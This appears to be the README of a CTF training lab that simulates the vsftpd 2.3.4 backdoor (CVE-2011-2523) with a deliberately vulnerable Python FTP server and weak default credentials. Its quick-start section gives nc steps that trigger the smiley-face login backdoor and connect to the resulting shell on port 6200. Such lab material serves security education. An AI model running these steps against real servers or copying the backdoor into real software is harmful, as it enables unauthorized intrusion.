# zerobyte-ctf

A CTF training lab by **Zero Byte** that simulates Metasploitable 2 vulnerabilities for educational purposes.  
Includes a vulnerable FTP server (vsftpd 2.3.4) and interactive learning pages covering networking fundamentals.

> ⚠️ For educational and CTF lab use only. Run only on isolated/local networks you own.

---

## What's Inside

| File | Description |
|---|---|
| `msf2_ftp_server.py` | Vulnerable vsftpd 2.3.4 FTP server (CVE-2011-2523, anonymous login, weak credentials) |
| `metasoplitable2.html` | Metasploitable 2 exploitation guide |
| `ctfs.html` | CTF challenges overview |
| `networkbasics.html` | Networking fundamentals |
| `osimodel.html` | OSI model reference |
| `tcpip.html` | TCP/IP reference |

---

## Requirements

- Python 3.8+
- No external dependencies

---

## Installation

```bash
git clone https://github.com/Youssefmohi666/zerobyte-ctf.git
cd zerobyte-ctf
```

---

## Running the FTP Server

```bash
# Port 21 — requires sudo
sudo python3 msf2_ftp_server.py

# Port 2121 — no sudo needed (recommended for local testing)
python3 msf2_ftp_server.py --port 2121

# Custom host and root directory
sudo python3 msf2_ftp_server.py --host 0.0.0.0 --port 21 --root /opt/ftp_files

# Debug mode
python3 msf2_ftp_server.py --port 2121 --debug
```

Once running, connect with any FTP client:

```bash
ftp <host> 21
# Username: anonymous  |  Password: anything
# Username: msfadmin   |  Password: msfadmin
```

---

## Opening the Learning Pages

No server needed — just open the HTML files directly in your browser:

```bash
# Linux / macOS
xdg-open ctfs.html

# Or drag any .html file into your browser
```

---

## Quick Start — Exploit the FTP Backdoor (CVE-2011-2523)

```bash
# 1. Start the server
sudo python3 msf2_ftp_server.py

# 2. Trigger the backdoor
nc 127.0.0.1 21
USER hacker:)
PASS anything

# 3. Connect to the shell in a new terminal
nc 127.0.0.1 6200
```

---

Made with ❤️ by [Zero Byte](https://github.com/Youssefmohi666)
